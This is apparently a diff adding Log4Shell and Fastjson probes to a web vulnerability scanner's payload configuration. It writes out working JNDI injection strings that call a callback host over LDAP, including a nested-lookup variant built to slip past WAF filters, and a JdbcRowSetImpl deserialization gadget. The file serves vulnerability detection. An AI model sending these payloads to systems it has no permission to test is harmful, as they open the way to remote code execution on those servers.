@@ -99,6 +99,60 @@
         }
       ]
     },
+    "log4shell": {
+      "description": "Log4Shell (CVE-2021-44228) — JNDI injection via Log4j lookups, including WAF bypass variants",
+      "tech_match": ["Java", "Tomcat", "Spring", "JBoss", "WebLogic", "Log4j"],
+      "param_match": ["data", "object", "payload", "token", "session", "username", "email", "search", "q", "user-agent", "referer"],
+      "probes": [
+        {
+          "payload": "${jndi:ldap://{{callback}}/a}",
+          "description": "Log4Shell JNDI lookup — if Log4j processes this, it makes an outbound LDAP connection to the callback. Absence of literal 'jndi' in response (processed, not reflected) plus timing from DNS/LDAP lookup confirms vulnerability.",
+          "matchers": [
+            {"type": "not_word", "words": ["${jndi:"]},
+            {"type": "timing", "min_ms": 5000}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        },
+        {
+          "payload": "${${lower:j}ndi:${lower:l}dap://{{callback}}/a}",
+          "description": "Log4Shell WAF bypass variant — nested lookups reconstruct 'jndi:ldap' at runtime, evading static keyword filters",
+          "matchers": [
+            {"type": "not_word", "words": ["${jndi:", "${lower:"]},
+            {"type": "timing", "min_ms": 5000}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    },
+    "fastjson": {
+      "description": "Fastjson deserialization — @type auto-type feature enables RCE via JNDI or class instantiation gadgets",
+      "tech_match": ["Java", "Spring", "FastJSON"],
+      "param_match": ["data", "object", "payload", "json", "body", "request"],
+      "probes": [
+        {
+          "payload": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"{{callback}}\"}",
+          "description": "Fastjson Inet4Address gadget — triggers DNS resolution to callback if auto-type is enabled, confirming deserialization",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [200, 500]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://{{callback}}/Exploit\",\"autoCommit\":true}",
+          "description": "Fastjson JdbcRowSetImpl JNDI gadget — triggers outbound LDAP connection via auto-type deserialization, enabling RCE",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [200, 500]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        }
+      ]
+    },
     "node_js": {
       "description": "Node.js insecure deserialization via node-serialize",
       "tech_match": ["Node.js", "Express"],
